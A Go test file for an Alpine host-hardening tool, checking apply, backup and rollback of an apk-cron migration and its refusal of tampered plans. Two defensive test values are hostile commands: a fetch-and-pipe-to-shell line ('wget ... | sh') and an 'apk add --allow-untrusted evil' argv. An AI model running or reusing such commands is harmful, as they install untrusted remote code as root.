package alpine_test

import (
	"context"
	"errors"
	"fmt"
	"io/fs"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/abbott/hardn/pkg/host"
	"github.com/abbott/hardn/pkg/host/alpine"
	"github.com/abbott/hardn/pkg/host/backup"
	"github.com/abbott/hardn/pkg/host/detect"
	"github.com/abbott/hardn/pkg/host/hostfake"
)

const runID = "20261017T143005Z-1a2b3c4d"

func backups(t *testing.T, w *world, enabled bool) *backup.Run {
	t.Helper()
	return backupsOn(t, w.h, enabled)
}

// backupsOn is a backup run over sys.
func backupsOn(t *testing.T, sys host.System, enabled bool) *backup.Run {
	t.Helper()
	r, err := backup.Open(sys, backup.Settings{Path: backup.DefaultPath, Enabled: enabled}, runID)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

// notBackup is cs without the backup run's own writes.
func notBackup(cs []string) []string {
	return slices.DeleteFunc(cs, func(c string) bool { return strings.Contains(c, " "+backup.DefaultPath) })
}

// TestApplyOriginMainHost: a stock host that origin/main configured gets
// apk-cron, then loses origin/main's apk-upgrade, after a backup taken
// before anything changed (also with enableBackups false: the rollback
// needs it). Each step is checked; the result is Configured, and the next
// plan is empty.
func TestApplyOriginMainHost(t *testing.T) {
	for _, v := range versions {
		for _, enabled := range []bool{true, false} {
			t.Run(fmt.Sprintf("%s/enableBackups=%v", v, enabled), func(t *testing.T) {
				w, f := stock(t, true), facts(t, v)
				p := w.plan(t, f)
				if !slices.Equal(steps(p), []string{"install", "remove-legacy"}) {
					t.Fatalf("steps = %q", steps(p))
				}
				m := w.mark()
				res, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{Backups: backups(t, w, enabled)})
				if err != nil || res.Restored {
					t.Fatalf("Apply = %+v, %v", res, err)
				}
				dir := backup.DefaultPath + "/" + runID
				want := []string{
					"mkdir " + backup.DefaultPath,
					"mkdir " + dir,
					"write-atomic " + dir + "/0001-apk-upgrade",
					"write-atomic " + dir + "/" + backup.ManifestName,
					"apk add apk-cron",
					"remove " + alpine.LegacyScript,
				}
				if got := w.changes(m); !slices.Equal(got, want) {
					t.Errorf("changes = %q\nwant      %q", got, want)
				}
				wantOutcome := backup.Taken
				if !enabled {
					wantOutcome = backup.TakenAnyway
				}
				if res.Legacy == nil || res.Legacy.Outcome != wantOutcome || res.Legacy.Entry.Path != alpine.LegacyScript || res.Legacy.Entry.File.Mode != 0o755 {
					t.Errorf("Legacy = %+v", res.Legacy)
				}
				if e, ok := w.h.Entry(dir + "/0001-apk-upgrade"); !ok || string(e.Data) != alpine.LegacyContent {
					t.Errorf("backup copy = %+v", e)
				}
				if !slices.Equal(res.Done, []alpine.Step{alpine.StepInstall, alpine.StepRemoveLegacy}) {
					t.Errorf("Done = %v", res.Done)
				}
				u := w.read(t, f)
				if s := u.Status(); s.State != alpine.StateConfigured || len(s.Findings) != 0 {
					t.Errorf("Status = %+v", s)
				}
				if p2, err := alpine.PlanUpdates(u); err != nil || len(p2.Changes) != 0 {
					t.Errorf("second plan = %q, %v", steps(p2), err)
				}
			})
		}
	}
}

// TestApplyEveryStep: crond stopped and out of the runlevel, and crashed.
func TestApplyEveryStep(t *testing.T) {
	for _, tc := range []struct {
		crond string
		want  []string
	}{
		{"stopped", []string{"apk add apk-cron", "rc-update add crond default", "rc-service crond start"}},
		{"crashed", []string{"apk add apk-cron", "rc-update add crond default", "rc-service crond restart"}},
	} {
		t.Run(tc.crond, func(t *testing.T) {
			w, f := stock(t, false), facts(t, "3.24")
			_ = w.h.Remove(context.Background(), alpine.RunlevelLink)
			w.crond = tc.crond
			p := w.plan(t, f)
			m := w.mark()
			if _, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{}); err != nil {
				t.Fatal(err)
			}
			if got := w.changes(m); !slices.Equal(got, tc.want) {
				t.Errorf("changes = %q\nwant      %q", got, tc.want)
			}
			if s := w.read(t, f).Status(); s.State != alpine.StateConfigured {
				t.Errorf("Status = %+v", s)
			}
		})
	}
}

// TestApplyLegacyOnly: on a host where apk-cron is in and origin/main's
// file was left, the plan removes the file alone, and its Rollback puts
// the file back and nothing else.
func TestApplyLegacyOnly(t *testing.T) {
	w, f := stock(t, true), facts(t, "3.24")
	w.installed = true
	w.h.AddFile(alpine.Script, []byte(apkCron), 0o755, 0, 0)
	p := w.plan(t, f)
	m := w.mark()
	res, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{Backups: backups(t, w, false)})
	if err != nil || !slices.Equal(res.Done, []alpine.Step{alpine.StepRemoveLegacy}) || res.Legacy == nil {
		t.Fatalf("Apply = %+v, %v", res, err)
	}
	if got, want := notBackup(w.changes(m)), []string{"remove " + alpine.LegacyScript}; !slices.Equal(got, want) {
		t.Errorf("changes = %q, want %q", got, want)
	}
	m = w.mark()
	if err := alpine.Rollback(context.Background(), w.h, p); err != nil {
		t.Fatal(err)
	}
	if got, want := w.changes(m), []string{"write-atomic " + alpine.LegacyScript}; !slices.Equal(got, want) {
		t.Errorf("rollback changes = %q, want %q", got, want)
	}
	if u := w.read(t, f); u.Legacy != alpine.LegacyHardn || u.Package != detect.Yes || u.Status().State != alpine.StateConfigured {
		t.Errorf("after = %+v", u)
	}
}

// TestApplyFails: whichever step fails, by an error or by succeeding
// without its effect, the steps that acted are undone, last first, and
// the host reads as it did before: a crashed crond reads stopped, and a
// legacy file someone else edited before the removal is left as they
// left it, with nothing to restore.
func TestApplyFails(t *testing.T) {
	errEdited := func(w *world) {
		w.hook = func(cmd string) {
			if cmd == "apk add apk-cron" {
				w.h.AddFile(alpine.LegacyScript, []byte(alpine.LegacyContent+"# local\n"), 0o755, 0, 0)
			}
		}
	}
	all := []string{"rc-service crond stop", "rc-update del crond default", "apk del apk-cron"}
	for _, tc := range []struct {
		name  string
		setup func(w *world)
		want  error
		undo  []string // the commands after the failure
		// wrap, when set, is the System Apply runs over.
		wrap func(w *world) host.System
		// crond and legacy, when set, are the states after, if not as before.
		crond  alpine.CrondState
		legacy alpine.Legacy
		// done, when set, is Result.Done.
		done []alpine.Step
	}{
		{"apk add fails", func(w *world) {
			w.h.Respond(hostfake.Response{Stderr: "ERROR: unable to select packages\n", ExitCode: 1}, "apk", "add", "apk-cron")
		}, nil, nil, nil, 0, 0, nil},
		{"apk add has no effect", func(w *world) { w.inert["apk add apk-cron"] = true }, alpine.ErrNotEffective, nil, nil, 0, 0, nil},
		{"no default runlevel", func(w *world) {
			_ = w.h.RemoveAll(context.Background(), detect.OpenRCRunlevels+"/default")
		}, alpine.ErrNotEffective, []string{"apk del apk-cron"}, nil, 0, 0, nil},
		{"crond start fails", func(w *world) {
			w.h.Respond(hostfake.Response{Stderr: " * ERROR: crond failed to start\n", ExitCode: 1}, "rc-service", "crond", "start")
		}, nil, []string{"rc-update del crond default", "apk del apk-cron"}, nil, 0, 0, nil},
		{"crond starts and dies", func(w *world) { w.inert["rc-service crond start"] = true }, alpine.ErrNotEffective,
			[]string{"rc-update del crond default", "apk del apk-cron"}, nil, 0, 0, nil},
		{"crashed crond stays down", func(w *world) { w.crond, w.inert["rc-service crond restart"] = "crashed", true }, alpine.ErrNotEffective,
			all, nil, alpine.CrondStopped, 0, nil},
		{"legacy edited during apk add", errEdited, alpine.ErrChanged, all, nil, 0, alpine.LegacyOther,
			[]alpine.Step{alpine.StepInstall, alpine.StepRunlevel, alpine.StepStart}},
		{"removal fails", func(*world) {}, errDisk, all, func(w *world) host.System {
			return faulty{System: w.h, fail: map[string]error{"remove " + alpine.LegacyScript: errDisk}}
		}, 0, 0, []alpine.Step{alpine.StepInstall, alpine.StepRunlevel, alpine.StepStart, alpine.StepRemoveLegacy}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w, f := stock(t, true), facts(t, "3.24")
			_ = w.h.Remove(context.Background(), alpine.RunlevelLink)
			w.crond = "stopped"
			tc.setup(w)
			before := w.read(t, f)
			p, err := alpine.PlanUpdates(before)
			if err != nil {
				t.Fatal(err)
			}
			var sys host.System = w.h
			if tc.wrap != nil {
				sys = tc.wrap(w)
			}
			res, err := alpine.Apply(context.Background(), sys, p, alpine.Options{Backups: backups(t, w, true)})
			var exit *host.ExitError
			if err == nil || tc.want != nil && !errors.Is(err, tc.want) || tc.want == nil && !errors.As(err, &exit) {
				t.Fatalf("Apply = %v, want %v", err, tc.want)
			}
			if !res.Restored || errors.Is(err, alpine.ErrNotRestored) {
				t.Errorf("Restored = %v, err %v", res.Restored, err)
			}
			if tc.done != nil && !slices.Equal(res.Done, tc.done) {
				t.Errorf("Done = %v, want %v", res.Done, tc.done)
			}
			crond, legacy := before.Crond, alpine.LegacyHardn
			if tc.crond != 0 {
				crond = tc.crond
			}
			if tc.legacy != 0 {
				legacy = tc.legacy
			}
			if after := w.read(t, f); after.Package != before.Package || after.Script != before.Script || after.Runlevel != before.Runlevel ||
				after.Crond != crond || after.Legacy != legacy {
				t.Errorf("after = %+v\nbefore  %+v", after, before)
			}
			var undone []string
			for _, c := range w.changes(0) {
				if c == "apk del apk-cron" || c == "rc-update del crond default" || c == "rc-service crond stop" {
					undone = append(undone, c)
				}
			}
			if !slices.Equal(undone, tc.undo) {
				t.Errorf("undo = %q, want %q", undone, tc.undo)
			}
		})
	}
}

// TestApplyCancelled: Ctrl-C during a step still undoes what ran, under
// context.WithoutCancel.
func TestApplyCancelled(t *testing.T) {
	w, f := stock(t, false), facts(t, "3.24")
	_ = w.h.Remove(context.Background(), alpine.RunlevelLink)
	w.crond = "stopped"
	p := w.plan(t, f)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	w.hook = func(cmd string) {
		if cmd == "rc-update add crond default" {
			cancel()
		}
	}
	res, err := alpine.Apply(ctx, w.h, p, alpine.Options{RestoreTimeout: time.Minute})
	if !errors.Is(err, context.Canceled) || !res.Restored {
		t.Fatalf("Apply = %+v, %v", res, err)
	}
	if u := w.read(t, f); u.Package != detect.No || u.Runlevel != detect.No || u.Crond != alpine.CrondStopped {
		t.Errorf("after = %+v", u)
	}
}

// TestApplyRefuses: before anything changes, Apply refuses a done
// context, a plan that removes the legacy script without a backup run, a
// host that changed since the plan or cannot be re-read, a plan its state
// does not give, a failed backup, and a backup copy that is not hardn's
// file (edited between the re-read and the backup). Only the backup run
// may have written.
func TestApplyRefuses(t *testing.T) {
	f := facts(t, "3.24")
	type wrapper = func(w *world) host.System
	fail := func(op, path string, err error) wrapper {
		return func(w *world) host.System { return faulty{System: w.h, fail: map[string]error{op + " " + path: err}} }
	}
	editAfterRead := func(w *world) host.System {
		return faulty{System: w.h, after: func(op, name string) {
			if op == "read-nofollow" && name == alpine.LegacyScript {
				w.h.AddFile(alpine.LegacyScript, []byte(alpine.LegacyContent+"# local\n"), 0o755, 0, 0)
			}
		}}
	}
	for _, tc := range []struct {
		name   string
		mutate func(w *world, p *alpine.Plan)
		opts   bool
		want   error
		wrap   wrapper // nil: the world's fake
	}{
		{"context done", func(*world, *alpine.Plan) {}, true, context.Canceled, nil},
		{"re-read fails", func(*world, *alpine.Plan) {}, true, fs.ErrPermission, fail("lstat", alpine.InitScript, fs.ErrPermission)},
		{"backup fails", func(*world, *alpine.Plan) {}, true, errDisk, fail("mkdir", backup.DefaultPath, errDisk)},
		{"copy is not hardn's", func(*world, *alpine.Plan) {}, true, alpine.ErrChanged, editAfterRead},
		{"no backup run", func(*world, *alpine.Plan) {}, false, alpine.ErrNoBackup, nil},
		{"legacy edited", func(w *world, _ *alpine.Plan) {
			w.h.AddFile(alpine.LegacyScript, []byte(alpine.LegacyContent+"# local\n"), 0o755, 0, 0)
		}, true, alpine.ErrChanged, nil},
		{"installed meanwhile", func(w *world, _ *alpine.Plan) {
			w.installed = true
			w.h.AddFile(alpine.Script, []byte(apkCron), 0o755, 0, 0)
		}, true, alpine.ErrChanged, nil},
		{"argv edited", func(_ *world, p *alpine.Plan) {
			p.Changes[0].Argv = []string{"apk", "add", "--allow-untrusted", "evil"}
		}, true, fs.ErrInvalid, nil},
		{"steps reordered", func(_ *world, p *alpine.Plan) { slices.Reverse(p.Changes) }, true, fs.ErrInvalid, nil},
		{"step added", func(_ *world, p *alpine.Plan) {
			p.Changes = append(p.Changes, alpine.Change{Step: alpine.StepStart, Argv: []string{"rc-service", "crond", "start"}, Undo: []string{"rc-service", "crond", "stop"}})
		}, true, fs.ErrInvalid, nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w := stock(t, true)
			p := w.plan(t, f)
			tc.mutate(w, &p)
			var sys host.System = w.h
			if tc.wrap != nil {
				sys = tc.wrap(w)
			}
			var opts alpine.Options
			if tc.opts {
				opts.Backups = backupsOn(t, sys, true)
			}
			ctx, cancel := context.WithCancel(context.Background())
			defer cancel()
			if tc.want == context.Canceled {
				cancel()
			}
			m := w.mark()
			res, err := alpine.Apply(ctx, sys, p, opts)
			if !errors.Is(err, tc.want) || len(res.Done) != 0 || res.Restored {
				t.Fatalf("Apply = %+v, %v, want %v", res, err, tc.want)
			}
			if got := notBackup(w.changes(m)); len(got) != 0 {
				t.Errorf("changes = %q", got)
			}
		})
	}
}

// TestRollback: after Apply, Rollback puts origin/main's file back with
// its mode and owner, stops crond, takes it out of the runlevel and
// removes apk-cron; a second Rollback changes nothing.
func TestRollback(t *testing.T) {
	w, f := stock(t, true), facts(t, "3.23")
	_ = w.h.Remove(context.Background(), alpine.RunlevelLink)
	w.crond = "stopped"
	before := w.read(t, f)
	p, err := alpine.PlanUpdates(before)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{Backups: backups(t, w, true)}); err != nil {
		t.Fatal(err)
	}
	m := w.mark()
	if err := alpine.Rollback(context.Background(), w.h, p); err != nil {
		t.Fatal(err)
	}
	// The model's own removals are recorded before the command that made
	// them.
	want := []string{"write-atomic " + alpine.LegacyScript, "rc-service crond stop", "remove " + alpine.RunlevelLink, "rc-update del crond default", "remove " + alpine.Script, "apk del apk-cron"}
	if got := w.changes(m); !slices.Equal(got, want) {
		t.Errorf("changes = %q\nwant      %q", got, want)
	}
	after := w.read(t, f)
	after.Evidence, before.Evidence = nil, nil
	if after.Package != before.Package || after.Script != before.Script || after.Runlevel != before.Runlevel || after.Crond != before.Crond ||
		after.Legacy != before.Legacy || string(after.LegacyFile.Data) != alpine.LegacyContent || after.LegacyFile.Mode != 0o755 {
		t.Errorf("after = %+v\nbefore  %+v", after, before)
	}
	m = w.mark()
	if err := alpine.Rollback(context.Background(), w.h, p); err != nil {
		t.Fatal(err)
	}
	if got := w.changes(m); len(got) != 0 {
		t.Errorf("second rollback changed %q", got)
	}
}

// TestRollbackLeavesOthers: a file someone else wrote at the legacy path
// after the removal is left alone, and reported.
func TestRollbackLeavesOthers(t *testing.T) {
	w, f := stock(t, true), facts(t, "3.24")
	p := w.plan(t, f)
	if _, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{Backups: backups(t, w, true)}); err != nil {
		t.Fatal(err)
	}
	w.h.AddFile(alpine.LegacyScript, []byte("#!/bin/sh\necho mine\n"), 0o755, 0, 0)
	err := alpine.Rollback(context.Background(), w.h, p)
	if !errors.Is(err, alpine.ErrNotRestored) || !errors.Is(err, alpine.ErrChanged) {
		t.Fatalf("Rollback = %v", err)
	}
	if e, _ := w.h.Entry(alpine.LegacyScript); string(e.Data) != "#!/bin/sh\necho mine\n" {
		t.Errorf("%s = %q", alpine.LegacyScript, e.Data)
	}
	if w.installed {
		t.Error("apk-cron still installed: the other steps are undone all the same")
	}
}

// TestApplyNotRestored: when the undo fails too, the error says so.
func TestApplyNotRestored(t *testing.T) {
	w, f := stock(t, false), facts(t, "3.24")
	w.crond = "stopped"
	w.h.Respond(hostfake.Response{ExitCode: 1}, "rc-service", "crond", "start")
	w.h.Respond(hostfake.Response{Stderr: "ERROR: Unable to lock database\n", ExitCode: 99}, "apk", "del", "apk-cron")
	p := w.plan(t, f)
	res, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{})
	if res.Restored || !errors.Is(err, alpine.ErrNotRestored) {
		t.Fatalf("Apply = %+v, %v", res, err)
	}
}

// TestApplyOtherPackages: apk add runs only when its simulation lists
// apk-cron's install and nothing else, so a world file edited by hand and
// not yet applied is never committed along with it; nothing is changed or
// undone then. Output with no change listed (a quiet apk) is refused too.
func TestApplyOtherPackages(t *testing.T) {
	for _, tc := range []struct {
		name  string
		setup func(w *world)
		want  error
	}{
		{"world edited by hand", func(w *world) { w.pending = "Purging openssh-server (10.2_p1-r0)" }, alpine.ErrOtherPackages},
		{"dependency upgraded", func(w *world) { w.pending = "Upgrading apk-tools (3.0.7-r0 -> 3.0.8-r0)" }, alpine.ErrOtherPackages},
		{"no change listed", func(w *world) {
			w.h.Respond(hostfake.Response{Stdout: "OK: 9 MiB in 25 packages\n"}, "apk", "add", "--simulate", "apk-cron")
		}, detect.ErrUnrecognised},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w, f := stock(t, false), facts(t, "3.24")
			p := w.plan(t, f)
			tc.setup(w)
			m := w.mark()
			res, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{})
			if !errors.Is(err, tc.want) || errors.Is(err, alpine.ErrNotRestored) || len(res.Done) != 0 || res.Restored {
				t.Fatalf("Apply = %+v, %v", res, err)
			}
			if w.pending != "" && !strings.Contains(err.Error(), w.pending) {
				t.Errorf("err = %v: the other change is not named", err)
			}
			if got := w.changes(m); len(got) != 0 || w.installed {
				t.Errorf("changes = %q, installed %v", got, w.installed)
			}
		})
	}
}

// TestRollbackOtherPackages: apk del, to undo the install, runs only when
// its simulation lists apk-cron's removal alone; otherwise apk-cron stays
// and the rollback reports it.
func TestRollbackOtherPackages(t *testing.T) {
	w, f := stock(t, false), facts(t, "3.24")
	p := w.plan(t, f)
	if _, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{}); err != nil {
		t.Fatal(err)
	}
	w.pending = "Purging openssh-server (10.2_p1-r0)"
	m := w.mark()
	err := alpine.Rollback(context.Background(), w.h, p)
	if !errors.Is(err, alpine.ErrNotRestored) || !errors.Is(err, alpine.ErrOtherPackages) {
		t.Fatalf("Rollback = %v", err)
	}
	if got := w.changes(m); len(got) != 0 || !w.installed {
		t.Errorf("changes = %q, installed %v", got, w.installed)
	}
}

// TestRollbackRefuses: a plan whose From.LegacyFile is not what hardn
// could have read (other bytes, a setuid bit, a group or other write bit,
// an owner other than root), or whose steps do not follow from its From,
// is refused before anything is undone, and the refusal wraps
// ErrNotRestored: a journal edited by hand cannot put a script of its own
// into DailyDir, which root's crond runs.
func TestRollbackRefuses(t *testing.T) {
	for _, tc := range []struct {
		name   string
		mutate func(p *alpine.Plan)
	}{
		{"legacy bytes", func(p *alpine.Plan) {
			p.From.LegacyFile.Data = []byte("#!/bin/sh\nwget -qO- http://192.0.2.7/x | sh\n")
		}},
		{"setuid", func(p *alpine.Plan) { p.From.LegacyFile.Mode = fs.ModeSetuid | 0o755 }},
		{"group-writable", func(p *alpine.Plan) { p.From.LegacyFile.Mode = 0o775 }},
		{"owner", func(p *alpine.Plan) { p.From.LegacyFile.UID, p.From.LegacyFile.GID = 1000, 1000 }},
		{"steps dropped", func(p *alpine.Plan) { p.Changes = p.Changes[:1] }},
	} {
		t.Run(tc.name, func(t *testing.T) {
			w, f := stock(t, true), facts(t, "3.24")
			p := w.plan(t, f)
			if _, err := alpine.Apply(context.Background(), w.h, p, alpine.Options{Backups: backups(t, w, true)}); err != nil {
				t.Fatal(err)
			}
			tc.mutate(&p)
			m := w.mark()
			err := alpine.Rollback(context.Background(), w.h, p)
			if !errors.Is(err, alpine.ErrNotRestored) || !errors.Is(err, fs.ErrInvalid) {
				t.Fatalf("Rollback = %v", err)
			}
			if got := w.changes(m); len(got) != 0 {
				t.Errorf("changes = %q", got)
			}
			if _, ok := w.h.Entry(alpine.LegacyScript); ok || !w.installed {
				t.Errorf("legacy present %v, installed %v", ok, w.installed)
			}
		})
	}
}
